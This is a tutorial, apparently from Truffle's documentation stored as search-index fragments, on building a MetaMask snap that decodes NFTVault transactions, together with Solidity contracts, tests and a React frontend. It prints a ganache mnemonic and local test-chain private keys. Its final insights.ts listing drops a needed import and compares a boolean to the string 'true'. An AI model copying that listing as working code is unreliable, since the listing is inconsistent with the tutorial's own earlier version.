preventDefault (); const data = new FormData ( e . target ); const nftAddress = \"\" + data . get ( \"nftAddressToWithdraw\" ); const tokenId = parseInt ( data . get ( \"nftTokenIdToWithdraw\" )); const functionData = NFTVaultInterface . encodeFunctionData ( 'withdrawNFT' ,[ nftAddress , tokenId ]); try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : NFTVaultContractAddress , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; And then, at the end of the return in function in the list of cards, add: { simpleNFTContractAddress && ( < Card content = { { title : 'Mint an NFT' , description : ( < form id = \"mintNFT\" onSubmit = { mintNFTHandler } > < p >< label > TokenURI :< /label></p> < p >< input type = \"text\" name = \"mintNFTtokenURI\" id = \"mintNFTtokenURI\" />< /p> < button type = \"submit\" > Mint < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} { NFTVaultContractAddress && ( < Card content = { { title : 'Approve the NFT Vault to hold your NFT' , description : ( < form id = \"approveVault\" onSubmit = { approveVaultHandler } > < p >< label > NFT Address :< /label></p> < p >< input type = \"text\" name = \"contractAddressToApprove\" id = \"contractAddressToApprove\" />< /p> < p >< label > NFT token ID :< /label></p> < p >< input type = \"text\" name = \"tokenIdToApprove\" id = \"tokenIdToApprove\" />< /p> < button type = \"submit\" > Approve < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} { NFTVaultContractAddress && ( < Card content = { { title : 'Deposit an NFT into the vault' , description : ( < form id = \"depositToVault\" onSubmit = { depositToVaultHandler } > < p >< em > Make sure you have approved the vault to hold this NFT !< /em></p> < p >< label > NFT Contract Address :< /label></p> < p >< input type = \"text\" name = \"nftAddressToDeposit\" id = \"nftAddressToDeposit\" />< /p> < p >< label > NFT token ID :< /label></p> < p >< input type = \"text\" name = \"nftTokenIdToDeposit\" id = \"nftTokenIdToDeposit\" />< /p> < p >< label > Second signer for withdraw approval :< /label></p> < p >< input type = \"text\" name = \"secondSigner\" id = \"secondSigner\" />< /p> < button type = \"submit\" > Deposit < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} { NFTVaultContractAddress && ( < Card content = { { title : 'Approve an NFT to be withdrawn' , description : ( < form id = \"approveWithdraw\" onSubmit = { approveWithdrawHandler } > < p >< em > Make sure you are calling this from the second signer !< /em></p> < p >< label > NFT Contract Address :< /label></p> < p >< input type = \"text\" name = \"nftAddressToApprove\" id = \"nftAddressToApprove\" />< /p> < p >< label > NFT token ID :< /label></p> < p >< input type = \"text\" name = \"nftTokenIdToApprove\" id = \"nftTokenIdToApprove\" />< /p> < button type = \"submit\" > Approve Withdrawal < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} { NFTVaultContractAddress && ( < Card content = { { title : 'Withdraw NFT' , description : ( < form id = \"withdraw\" onSubmit = { withdrawHandler } > < p >< em > Make sure the second signer has already approved this !< /em></p> < p >< label > NFT Contract Address :< /label></p> < p >< input type = \"text\" name = \"nftAddressToWithdraw\" id = \"nftAddressToWithdraw\" />< /p> < p >< label > NFT token ID :< /label></p> < p >< input type = \"text\" name = \"nftTokenIdToWithdraw\" id = \"nftTokenIdToWithdraw\" />< /p> < button type = \"submit\" > Withdraw < /button> < /form> ), } } disabled = { false } fullWidth = { false } /> )} To run through the entire life cycle you can take these steps: Import a funded account to your MetaMask wallet using the private keys generated by ganache Hit connect to install the snap Mint an NFT (you can put in an arbitrary string for the tokenURI). If this is the first mint, the token ID will be 1. Approve the NFTVault contract to transfer the NFT. Copy and paste the SimpleNFT address, which you can find in the SimpleNFT.json file or by calling truffle networks Deposit the NFT. For the second signer, use another pre-funded account number from the list of accounts generated by ganache Approve the withdrawal. Import the second signer account into your wallet by importing the private key. Switch and connect to that account to send the approval. Withdraw the NFT. You'll need to switch back to the original account in order to do the withdrawal. Let's build the snap! \u00b6 This snap will do a few things: It will be able to identify which smart contract we are calling If we are calling the NFTVault contract, it will identify what method we are calling If we are calling withdrawNFT , it will communicate whether or not the NFT is approved to be withdraw and who the approver is Edit packages/snap/snap.manifest.json \u00b6 We'll need to give new permissions to your snap. To do so, add \"endowment:transaction-insight\": {} to initialPermissions . This permission gives the snap read-only access to raw transaction payloads before they are accepted for signing by the user. Edit packages/snap/tsconfig.json \u00b6 In order to access the contract build files, we'll need to add this to the tsconfig.json file: \"compilerOptions\" : { \"resolveJsonModule\" : true } Edit packages/snap/src/index.ts \u00b6 Then, for our snap to use our transaction insight modify the imports: import { OnTransactionHandler , OnRpcRequestHandler , } from '@metamask/snap-types' ; import { getInsights } from './insights' ; Then, add the following function: /** * Handle an incoming transaction, and return any insights. * * @param args - The request handler args as object. * @param args.transaction - The transaction object. * @returns The transaction insights. */ export const onTransaction : OnTransactionHandler = async ({ transaction }) => { return { insights : await getInsights ( transaction ), }; }; Create packages/snap/src/insights.ts \u00b6 First, we'll need to install the necessary dependencies: cd ../snap yarn add @metamask/abi-utils ethers Then create a new file called insights.ts . Let's start out with the bare bones. Add this code in: import { add0x , bytesToHex , hasProperty , isObject , remove0x , } from '@metamask/utils' ; import { decode } from '@metamask/abi-utils' ; import { ethers } from 'ethers' ; import SimpleNft from './contracts/SimpleNFT.json' ; import NFTVault from './contracts/NFTVault.json' ; /** * As an example, get transaction insights by looking at the transaction data * and attempting to decode it. * * @param transaction - The transaction to get insights for. * @returns The transaction insights. */ export async function getInsights ( transaction : Record < string , unknown > ) { const returnObject : Record < string , unknown > = { message : 'Unknown transaction' , }; const networkId = await wallet . request ({ method : 'net_version' }); const SimpleNFTContractAddress = SimpleNft . networks [ networkId ] ? SimpleNft . networks [ networkId ]. address : null ; const NFTVaultContractAddress = NFTVault . networks [ networkId ] ? NFTVault . networks [ networkId ]. address : null ; try { // Check if the transaction has data. if ( ! isObject ( transaction ) || ! hasProperty ( transaction , 'data' ) || typeof transaction . data !== 'string' ) { throw \"Transaction data received is not an object.\" ; } switch ( transaction . to ) { case SimpleNFTContractAddress . toLowerCase () : returnObject . message = \"You are interacting with the SimpleNFT.sol contract\" ; break ; case NFTVaultContractAddress . toLowerCase () : returnObject . message = \"You are interacting with the NFTVault.sol contract\" ; break ; default : returnObject . message = \"I do not recognize the address \" + transaction . to ; } return returnObject ; } catch ( error ) { console . error ( error ); return returnObject ; } } In this code, we check the transaction.to property to see what the calling contract is. If you want to see this in action, we'll have to reinstall the snap. Go back to the browser and hit Reconnect . MetaMask should prompt you to reinstall. Note that the installation screen now has an additional permission, \"Fetch and display transaction insights.\" After confirming, mint an NFT. In your MetaMask wallet, the transaction window has a new tab, \"Typescript Example...\" Click on this tab to view your transaction insights output. You should see that the SimpleNFT contract address was recognized! In Solidity, the first 4 bytes of an encoded function (which we demonstrated in the packages/site portion of this tutorial), identify what the function is called. We can use this fact to translate what functions are actually being called by the NFTVault contract. In the NFTVault switch case statement, add: const transactionData = remove0x ( transaction . data ); // Get function signature, i.e., the first 4 bytes of the data. const functionSignature = transactionData . slice ( 0 , 8 ); let matchingFunction = '' ; switch ( functionSignature ) { case '4e1ca120' : matchingFunction = 'approveWithdraw(address,uint256)' ; break ; case '97be5523' : matchingFunction = 'depositNFT(address,uint256,address)' ; break ; case 'b537b269' : matchingFunction = 'removeApproval(address,uint256)' ; break ; case '6088e93a' : matchingFunction = 'withdrawNFT(address,uint256)' ; break ; default : break ; } if ( matchingFunction . length > 0 ) { returnObject . method = matchingFunction ; } After you reconnect your snap, you should see something like this: To get even more granular, let's actually decode the argument data when withdrawNFT is called. First, add this function, which will convert certain arguments which are not JSON serializable to strings: /** * The ABI decoder returns certain which are not JSON serializable. This * function converts them to strings. * * @param value - The value to convert. * @returns The converted value. */ function normalize4ByteValue ( value : unknown ) : unknown { if ( Array . isArray ( value )) { return value . map ( normalize4ByteValue ); } if ( value instanceof Uint8Array ) { return bytesToHex ( value ); } if ( typeof value === 'bigint' ) { return value . toString (); } return value ; } Then, in the NFTVault switch case, add: if ( matchingFunction === 'withdrawNFT(address,uint256)' ) { // This is a function name in the shape \"functionName(arg1Type,arg2Type,...)\", so // we do a simple slice to get the argument types. const parameterTypes = matchingFunction . slice ( matchingFunction . indexOf ( '(' ) + 1 , matchingFunction . indexOf ( ')' )) . split ( ',' ); // Decode the parameters using the ABI utils library. const decodedParameters = decode ( parameterTypes , add0x ( transactionData . slice ( 8 )), ); returnObject . args = decodedParameters . map ( normalize4ByteValue ); // now show them whether they are approved to withdraw or not returnObject . canWithdraw = 'No' ; try { const provider = new ethers . providers . Web3Provider ( wallet ); const vaultContract = new ethers . Contract ( NFTVaultContractAddress , NFTVault . abi , provider , ); const ethersReadResult = await vaultContract . getApproval (... returnObject . args ); if ( ethersReadResult . length === 3 && ethersReadResult [ 2 ] === true ) { returnObject . canWithdraw = 'Yes' ; } returnObject . readResult = ethersReadResult ; } catch ( err ) { returnObject . canWithdraw = ` ${ err } ` ; } } Now, when you call withdrawNFT , the snap should give you some information about whether or not the NFT can be withdrawn and who the owner and second signer are! Note that this function is reading data from the chain using the getApproval method. Because getApproval and withdrawNFT have the same arguments, we can pass those on to getApproval to see if the NFT is approved with withdrawal or not. Plus, as a bonus, the Snap could be updated to use this information: To tell the user the address of the second signer To tell them if they are attempting to withdraw an NFT they do not own To tell them if the NFT is not found (the first two values will be 0x0) The completed code looks like this: import { add0x , bytesToHex , hasProperty , isObject , remove0x , } from '@metamask/utils' ; import { decode } from '@metamask/abi-utils' ; import { ethers } from 'ethers' ; import NFTVault from './contracts/NFTVault.json' ; /** * As an example, get transaction insights by looking at the transaction data * and attempting to decode it. * * @param transaction - The transaction to get insights for. * @returns The transaction insights. */ export async function getInsights ( transaction : Record < string , unknown > ) { const returnObject : Record < string , any > = { message : 'Unknown transaction' , }; const networkId = await wallet . request ({ method : 'net_version' }); const SimpleNFTContractAddress = SimpleNft . networks [ networkId ] ? SimpleNft . networks [ networkId ]. address : null ; const NFTVaultContractAddress = NFTVault . networks [ networkId ] ? NFTVault . networks [ networkId ]. address : null ; try { // Check if the transaction has data. if ( ! isObject ( transaction ) || ! hasProperty ( transaction , 'data' ) || typeof transaction . data !== 'string' ) { throw \"Transaction data received is not an object.\" ; } switch ( transaction . to ) { case SimpleNFTContractAddress . toLowerCase () : returnObject . message = \"You are interacting with the SimpleNFT.sol contract\" ; break ; case NFTVaultContractAddress . toLowerCase () : returnObject . message = \"You are interacting with the NFTVault.sol contract\" ; const transactionData = remove0x ( transaction . data ); // Get function signature, i.e., the first 4 bytes of the data. const functionSignature = transactionData . slice ( 0 , 8 ); let matchingFunction = '' ; switch ( functionSignature ) { case '4e1ca120' : matchingFunction = 'approveWithdraw(address,uint256)' ; break ; case '97be5523' : matchingFunction = 'depositNFT(address,uint256,address)' ; break ; case 'b537b269' : matchingFunction = 'removeApproval(address,uint256)' ; break ; case '6088e93a' : matchingFunction = 'withdrawNFT(address,uint256)' ; break ; default : break ; } if ( matchingFunction . length > 0 ) { returnObject . method = matchingFunction ; } if ( matchingFunction === 'withdrawNFT(address,uint256)' ) { // This is a function name in the shape \"functionName(arg1Type,arg2Type,...)\", so // we do a simple slice to get the argument types. const parameterTypes = matchingFunction . slice ( matchingFunction . indexOf ( '(' ) + 1 , matchingFunction . indexOf ( ')' )) . split ( ',' ); // Decode the parameters using the ABI utils library. const decodedParameters = decode ( parameterTypes , add0x ( transactionData . slice ( 8 )), ); returnObject . args = decodedParameters . map ( normalize4ByteValue ); // now show them whether they are approved to withdraw or not returnObject . canWithdraw = 'No' ; try { const provider = new ethers . providers . Web3Provider ( wallet ); const vaultContract = new ethers . Contract ( NFTVaultContractAddress , NFTVault . abi , provider , ); const ethersReadResult = await vaultContract . getApproval (... returnObject . args ); if ( ethersReadResult . length === 3 && ethersReadResult [ 2 ] === 'true' ) { returnObject . canWithdraw = 'Yes' ; } returnObject . readResult = ethersReadResult ; } catch ( err ) { returnObject . canWithdraw = ` ${ err } ` ; } } } return returnObject ; } catch ( error ) { console . error ( error ); return returnObject ; } } /** * The ABI decoder returns certain which are not JSON serializable. This * function converts them to strings. * * @param value - The value to convert. * @returns The converted value. */ function normalize4ByteValue ( value : unknown ) : unknown { if ( Array . isArray ( value )) { return value . map ( normalize4ByteValue ); } if ( value instanceof Uint8Array ) { return bytesToHex ( value ); } if ( typeof value === 'bigint' ) { return value . toString (); } return value ; } Future Extensions \u00b6 There's a lot of really cool stuff you can do with encoding and decoding! Check out Truffle's decoder and encoder libraries for more complex use cases. If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or hang with the Unleashed community in general, join our Discord ! You can ask Snaps related questions in the #Snaps-dev channel there. Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: How to build a MetaMask snap"}, {"location": "guides/metamask-snap/#web3-unleashed-how-to-build-a-metamask-snap", "text": "Written by Emily Lin and Christian Montoya Last updated 12/16/2022", "title": "Web3 Unleashed: How to build a MetaMask snap"}, {"location": "guides/metamask-snap/#overview", "text": "In this episode of Web3 Unleashed, we'll be covering MetaMask Snaps, a new way to extend your MetaMask functionality. Snaps product manager Christian Montoya and engineer Guillaume Roux will be joining us to talk about what they are, how they work, and how you can get started building one! Specifically, we'll be leveraging the Truffle Snaps box to build a wallet experience that provides insights into your wallet transactions. Watch our livestream for a more detailed walkthrough! You can read more about Snaps here . The completed code lives here .", "title": "Overview"}, {"location": "guides/metamask-snap/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here", "title": "Create an Infura account and project"}, {"location": "guides/metamask-snap/#install-a-metamask-flask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask Flask wallet. You can download it and create one here . Make sure to install Flask in a new browser profile or disable any existing installed versions of MetaMask. Running multiple instances of MetaMask in the same browser profile will break dapp interactions.", "title": "Install a MetaMask Flask wallet"}, {"location": "guides/metamask-snap/#download-system-requirements", "text": "You'll need to install: Node.js , v14 or higher truffle ganache CLI yarn v3.x, run corepack enable if you are using Node v16 or higher", "title": "Download System Requirements"}, {"location": "guides/metamask-snap/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/metamask-snap/#set-up-your-project", "text": "In this project, we'll start off using the MetaMask Snap Truffle box to scaffold our project! truffle unbox metamask/snap-box tx-snap cd tx-snap Then, set up your development environment by running: yarn install && yarn start Once ganache gets started, make sure you copy paste and save off the mnemonic, account numbers, and private keys! You'll be able to get the account numbers again, but will not be able to retrieve the mnemonic and private keys. If you would like these numbers to be stable, add in your own mnemonic. The output looks something like this: YN0000: [ truffle ] : mnemonic used: often innocent sphere luggage almost leaf faint fan goat lab swim use \u27a4 YN0000: [ truffle ] : { \u27a4 YN0000: [ truffle ] : '0x49abb8858966f2d4b2b983e7ea5104c0f6cf495a' : { \u27a4 YN0000: [ truffle ] : secretKey: '0xf67606f22f122dcf7f6c2ee6a942a4d0bc1da6e2bc0a007b1547408dd2537eba' , \u27a4 YN0000: [ truffle ] : balance: 1000000000000000000000n, \u27a4 YN0000: [ truffle ] : unlocked: true \u27a4 YN0000: [ truffle ] : } , \u27a4 YN0000: [ truffle ] : '0x7318563db067c3ffaa81d82f77d176e7a8cde704' : { \u27a4 YN0000: [ truffle ] : secretKey: '0x6a6698b543e5c5a1af7c199187757fda1ebcf6c7490eecad4ee79ff44de84b45' , \u27a4 YN0000: [ truffle ] : balance: 1000000000000000000000n, ... Additionally, note that if you restart this test instance, you'll have to redeploy your contracts and reconnect your Snap to get the most up to date contract addresses. So, if you want to persist transaction history, consider using ganache's dbPath option. Alternatively, feel free to just set up your own instance of ganache through the cli ! This is just a convenience script to help you get started, but you can run ganache in a separate terminal and in the background using ganache --detach ! You can read more about the different options here . And clean up some files that are only useful within the GitHub organization: ./scripts/cleanup.sh", "title": "Set Up Your Project"}, {"location": "guides/metamask-snap/#whats-in-the-box", "text": "This box not only sets up the basic MetaMask Snap template, but adds in additional scaffolding to demonstrate how you might incorporate smart contract interactions within your Snap flow. We'll step through the most important parts of this Truffle box.", "title": "What's in the box?"}, {"location": "guides/metamask-snap/#packagessnapsrcindexts", "text": "We will be editing this file to customize our snap! In the Truffle box, the example snap simply displays a custom confirmation screen. export const onRpcRequest : OnRpcRequestHandler = ({ origin , request }) => { switch ( request . method ) { case 'hello' : return wallet . request ({ method : 'snap_confirm' , params : [ { prompt : getMessage ( origin ), description : 'This custom confirmation is just for display purposes.' , textAreaContent : 'But you can edit the snap source code to make it do something, if you want to!' , }, ], }); default : throw new Error ( 'Method not found.' ); } }; If you want your snap to communicate with an external dapp or other snap, a snap must implement its own JSON-RPC API by exporting the function onRpcRequest . Since we want to display a custom confirmation screen in the MetaMask UI, we send the method snap_confirm via wallet.request to be processed by MetaMask.", "title": "packages/snap/src/index.ts"}, {"location": "guides/metamask-snap/#packagessnapsnapmanifestjson", "text": "This file tells MetaMask important information about your snap. Important pieces to highlight in the manifest: description : the description of your snap proposedName : the name of your snap source.location : where your snap is published source.shasum : the hash of your source code to verify the integrity of the snap when called initialPermissions : this specifies the permissions a snap can have", "title": "packages/snap/snap.manifest.json"}, {"location": "guides/metamask-snap/#packagessnapsnapconfigjs", "text": "This file is used to override the Snaps cli options and should not be published. You can get more detail on what makes up a snap in the MetaMask documentation here .", "title": "packages/snap/snap.config.js"}, {"location": "guides/metamask-snap/#packagessitesrcutilssnapts", "text": "This file contains all the methods necessary to interact with a snap in your frontend application. To interact with the MetaMask Snaps API, we call the relevant methods using window.ethereum.request : getSnaps calls wallet_getSnaps to get the user's permitted Snaps. connectSnap calls wallet_enable to install/connect Snaps to the user's account. The snapId is the location of the installed snap. getSnap gets a specific snap object. sendHello calls wallet_invokeSnap to call the JSON-RPC method of the specified snap. In this tutorial, the snap is installed locally, specified as local:http://localhost:8080 . Then, this method calls the hello case as defined by the onRpcRequest method we defined earlier in packages/snap/src/index.ts .", "title": "packages/site/src/utils/snap.ts"}, {"location": "guides/metamask-snap/#packagestruffle", "text": "This folder contains a basic Truffle project that is set up for you to write, deploy, and test your smart contracts. Currently, it is populated with a SimpleStorage contract that does not interact with the snap. We will be modifying this later!", "title": "packages/truffle"}, {"location": "guides/metamask-snap/#packagestrufflescriptsganachejs", "text": "In the example snap that we are building in this guide, we will be connecting to ganache, our local test chain. This script programmatically sets up an instance of ganache that forks Ethereum mainnet.", "title": "packages/truffle/scripts/ganache.js"}, {"location": "guides/metamask-snap/#lets-get-building", "text": "We will start off by building an NFT vault that allows users to deposit and store their NFTs securely by requiring a second signer to approve withdrawals. Then, we'll create a snap that surfaces transaction insights during withdrawal to let the user know whether or not the NFT is actually approved for withdrawal.", "title": "Let's get building!"}, {"location": "guides/metamask-snap/#create-the-smart-contracts", "text": "In order to build the NFT vault, go to the packages/truffle directory and create two smart contracts and a test: cd packages/truffle truffle create contract SimpleNFT truffle create contract NFTVault truffle create test NftVault Let's also install packages we'll need later: yarn add @openzeppelin/contracts yarn add --dev @openzeppelin/test-helpers", "title": "Create the smart contracts"}, {"location": "guides/metamask-snap/#create-simplenft", "text": "We'll be using Open Zeppelin's ERC721URIStorage contract to create SimpleNFT . This is simply so that we can quickly mint NFTs for testing. The code looks like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; contract SimpleNFT is ERC721URIStorage { using Counters for Counters . Counter ; Counters . Counter private _tokenIds ; event NFTMinted ( uint256 ); constructor () ERC721 ( \"SimpleNFT\" , \"SNFT\" ) {} function mint ( string memory _tokenURI ) public { _tokenIds . increment (); uint256 newTokenId = _tokenIds . current (); _safeMint ( msg . sender , newTokenId ); _setTokenURI ( newTokenId , _tokenURI ); emit NFTMinted ( newTokenId ); } } If you want a deeper dive into the methods of this NFT, see our tutorial on creating an NFT here .", "title": "Create SimpleNFT"}, {"location": "guides/metamask-snap/#create-nftvault", "text": "The completed code for the NFTVault looks like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/interfaces/IERC721.sol\" ; contract NFTVault { struct approval { address owner ; address secondSigner ; bool approved ; } // map nftContract => nftID => approval mapping ( address => mapping ( uint256 => approval )) private approvals ; function depositNFT ( address nftContract , uint tokenId , address secondSigner ) public { require ( approvals [ nftContract ][ tokenId ]. owner == address ( 0 ), \"NFT already deposited!\" ); approvals [ nftContract ][ tokenId ] = approval ( msg . sender , secondSigner , false ); IERC721 ( nftContract ). transferFrom ( msg . sender , address ( this ), tokenId ); } function withdrawNFT ( address nftContract , uint tokenId ) public { approval memory data = approvals [ nftContract ][ tokenId ]; require ( data . owner != address ( 0 ), \"NFT not deposited\" ); require ( data . owner == msg . sender , \"Not owner of the NFT\" ); require ( data . approved , \"Second signer has not signed approval\" ); IERC721 ( nftContract ). safeTransferFrom ( address ( this ), data . owner , tokenId ); delete approvals [ nftContract ][ tokenId ]; } function approveWithdraw ( address nftContract , uint tokenId ) public { approval storage data = approvals [ nftContract ][ tokenId ]; require ( data . secondSigner == msg . sender , \"Not an approver\" ); if ( ! data . approved ) { data . approved = true ; } } function getApproval ( address nftContract , uint tokenId ) public view returns ( address , address , bool ) { approval memory data = approvals [ nftContract ][ tokenId ]; return ( data . owner , data . secondSigner , data . approved ); } function removeApproval ( address nftContract , uint tokenId ) public { approval storage data = approvals [ nftContract ][ tokenId ]; require ( data . secondSigner == msg . sender , \"Not an approver\" ); if ( data . approved ) { data . approved = false ; } } } Let's step through the code! First, we create an approval struct in order to store the relevant information about each deposited NFT: the address of the owner, the address of the second approver, and whether or not the second signer has approved the NFT for withdrawal. struct approval { address owner ; address secondSigner ; bool approved ; } Then, we create an approvals mapping that maps the NFT contract address and token id to an approval struct to store information about each deposited NFT. // map nftContract => nftID => approval mapping ( address => mapping ( uint256 => approval )) private approvals ; Now, let's dive into the meat of the smart contract, the methods! This smart contract consists of a few methods: function depositNFT ( address nftContract , uint tokenId , address secondSigner ) public { require ( approvals [ nftContract ][ tokenId ]. owner == address ( 0 ), \"NFT already deposited!\" ); approvals [ nftContract ][ tokenId ] = approval ( msg . sender , secondSigner , false ); IERC721 ( nftContract ). transferFrom ( msg . sender , address ( this ), tokenId ); } depositNFT transfers ownership of the NFT to the smart contract and stores who the second signer is to approve for withdrawal. Note that this requires that the NFTVault contract was first approved to make transfers. This call would have to happen before the depositNFT function is called by calling the approve method on the NFT smart contract. You can read more about the approve method here . function withdrawNFT ( address nftContract , uint tokenId ) public { approval memory data = approvals [ nftContract ][ tokenId ]; require ( data . owner != address ( 0 ), \"NFT not deposited\" ); require ( data . owner == msg . sender , \"Not owner of the NFT\" ); require ( data . approved , \"Second signer has not signed approval\" ); IERC721 ( nftContract ). safeTransferFrom ( address ( this ), data . owner , tokenId ); delete approvals [ nftContract ][ tokenId ]; } withdrawNFT transfers ownership of the NFT from the smart contract to the user. We retrieve the approval data to check that the withdrawer was actually the owner of the NFT and the NFT was approved to be withdrawn by the second signer. Afterwards, we transfer the NFT from the smart contract back to the owner and delete this NFT information from the stored data. function approveWithdraw ( address nftContract , uint tokenId ) public { approval storage data = approvals [ nftContract ][ tokenId ]; require ( data . secondSigner == msg . sender , \"Not an approver\" ); if ( ! data . approved ) { data . approved = true ; } } approveWithdraw should be called by the second signer to approve the NFT for withdrawal. Note that we get data using the storage key word. This is because we want to actually change the data stored in the contract. function getApproval ( address nftContract , uint tokenId ) public view returns ( address , address , bool ) { approval memory data = approvals [ nftContract ][ tokenId ]; return ( data . owner , data . secondSigner , data . approved ); } getApproval is a read method that returns approval information about an NFT to be used by the MetaMask snap. Note that we cannot return structs in solidity. Instead, we return an array of information as defined by (address, address, bool) . function removeApproval ( address nftContract , uint tokenId ) public { approval storage data = approvals [ nftContract ][ tokenId ]; require ( data . secondSigner == msg . sender , \"Not an approver\" ); if ( data . approved ) { data . approved = false ; } } removeApproval is called by the second signer of an NFT to revoke their approval.", "title": "Create NFTVault"}, {"location": "guides/metamask-snap/#create-the-migration-script", "text": "We need to tell Truffle how to deploy our contracts by writing a migration script. Create 1_deploy_contracts.js under the packages/truffle/migration folder: const SimpleNFT = artifacts . require ( 'SimpleNFT' ); const NFTVault = artifacts . require ( 'NFTVault' ); module . exports = function ( deployer ) { deployer . deploy ( SimpleNFT ); deployer . deploy ( NFTVault ); };", "title": "Create the migration script"}, {"location": "guides/metamask-snap/#write-tests", "text": "The completed test code looks like this: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { constants , expectRevert } = require ( \"@openzeppelin/test-helpers\" ); const NFTVault = artifacts . require ( \"NFTVault\" ); const SimpleNFT = artifacts . require ( \"SimpleNFT\" ); async function mintNft ( simpleNFT , sender ) { txn = await simpleNFT . mint ( \"fakeURI\" , { from : sender }); return txn . logs [ 1 ]. args [ 0 ]. toNumber (); } function assertApproval ( actual , expected ) { assert . equal ( actual [ 0 ], expected . owner , \"owner is not correct\" ); assert . equal ( actual [ 1 ], expected . secondSigner , \"secondSigner is not correct\" ); assert . equal ( actual [ 2 ], expected . approved , \"approved is not correct\" ); } contract ( \"NFTVault\" , function ( accounts ) { const tokenOwner = accounts [ 1 ]; const secondSigner = accounts [ 2 ]; let nftVault ; let simpleNFT ; let tokenId ; before ( 'should reuse variables' , async () => { nftVault = await NFTVault . deployed (); simpleNFT = await SimpleNFT . deployed (); }); beforeEach ( 'should mint and deposit NFT' , async () => { tokenId = ( await mintNft ( simpleNFT , tokenOwner , { from : tokenOwner })); await simpleNFT . approve ( nftVault . address , tokenId , { from : tokenOwner }); await nftVault . depositNFT ( simpleNFT . address , tokenId , secondSigner , { from : tokenOwner }); }); it ( \"should deposit NFT with correct data and should not deposit twice\" , async function () { let expected = { owner : tokenOwner , secondSigner : secondSigner , approved : false }; assertApproval ( await nftVault . getApproval ( simpleNFT . address , tokenId ), expected ); assert . equal ( await simpleNFT . ownerOf ( tokenId ), nftVault . address ); await expectRevert ( nftVault . depositNFT ( simpleNFT . address , tokenId , secondSigner , { from : tokenOwner }), \"NFT already deposited!\" ); }); it ( \"should not approve withdrawal if not second signer\" , async function () { await expectRevert ( nftVault . approveWithdraw ( simpleNFT . address , tokenId , { from : accounts [ 3 ]}), \"Not an approver\" ); }); it ( \"should approve withdrawal if second signer\" , async function () { await nftVault . approveWithdraw ( simpleNFT . address , tokenId , { from : secondSigner }); let expected = { owner : tokenOwner , secondSigner : secondSigner , approved : true }; assertApproval ( await nftVault . getApproval ( simpleNFT . address , tokenId ), expected ); }); it ( \"should not withdraw if not owner\" , async function () { await expectRevert ( nftVault . withdrawNFT ( simpleNFT . address , tokenId , { from : accounts [ 3 ]}), \"Not owner of the NFT\" ); }); it ( \"should not withdraw if not approved\" , async function () { await expectRevert ( nftVault . withdrawNFT ( simpleNFT . address , tokenId , { from : tokenOwner }), \"Second signer has not signed approval\" ); }); it ( \"should withdraw and not withdraw twice\" , async function () { await nftVault . approveWithdraw ( simpleNFT . address , tokenId , { from : secondSigner }); await nftVault . withdrawNFT ( simpleNFT . address , tokenId , { from : tokenOwner }); let expected = { owner : constants . ZERO_ADDRESS , secondSigner : constants . ZERO_ADDRESS , approved : false } assertApproval ( await nftVault . getApproval ( simpleNFT . address , tokenId ), expected ); assert . equal ( await simpleNFT . ownerOf ( tokenId ), tokenOwner ); await expectRevert ( nftVault . withdrawNFT ( simpleNFT . address , tokenId , { from : tokenOwner }), \"NFT not deposited\" ); }); it ( \"should not remove approval if not second signer\" , async function () { await expectRevert ( nftVault . removeApproval ( simpleNFT . address , tokenId , { from : accounts [ 3 ]}), \"Not an approver\" ); }); it ( \"should remove approval if second signer\" , async function () { await nftVault . removeApproval ( simpleNFT . address , tokenId , { from : secondSigner }); let expected = { owner : tokenOwner , secondSigner : secondSigner , approved : false } assertApproval ( await nftVault . getApproval ( simpleNFT . address , tokenId ), expected ); }); }); Let's go through the highlights: @openzeppelin/test-helpers gives us some nifty utilities like constants for the zero address, and expectRevert to help us check that our require statements are correctly failing async function mintNft(simpleNFT, sender) is a helper function to quickly mint an NFT for testing function assertApproval(actual, expected) is a helper function that asserts whether or not the actual approval object has the same properties as the expected approval object beforeEach will mint, approve, and deposit an NFT before each test so that we are starting with fresh data each time", "title": "Write tests"}, {"location": "guides/metamask-snap/#run-the-tests", "text": "If you ran yarn start earlier, it should've brought up an instance of ganache on 8545, which is the development network defined in truffle-config.js . Then, just run truffle test and the output should look like this: Contract: NFTVault \u2714 should deposit NFT with correct data \u2714 should not approve withdrawal if not second signer ( 272ms ) \u2714 should approve withdrawal if second signer \u2714 should not withdraw if not owner \u2714 should not withdraw if not approved \u2714 should withdraw ( 175ms ) \u2714 should not remove approval if not second signer \u2714 should remove approval if second signer 8 passing ( 3s )", "title": "Run the tests!"}, {"location": "guides/metamask-snap/#create-the-frontend-of-your-dapp", "text": "In order to interact with the NFT Vault, we'll be building a quick site. This guides assumes you already have basic familiarity with React.", "title": "Create the frontend of your dapp!"}, {"location": "guides/metamask-snap/#edit-packagestruffletruffle-configjs", "text": "In order for our frontend to be able to interact with our deployed contracts, we'll need to modify the directory where our smart contract builds are written to. Let's add it into our snap src folder. Modify the contracts_build_directory property as follows: contracts_build_directory : '../snap/src/contracts' , Now, we want to actually deploy these contracts! Call: truffle migrate You should see something like this: Compiling your contracts... =========================== > Compiling ./contracts/NFTVault.sol > Compiling ./contracts/SimpleNFT.sol > Compiling 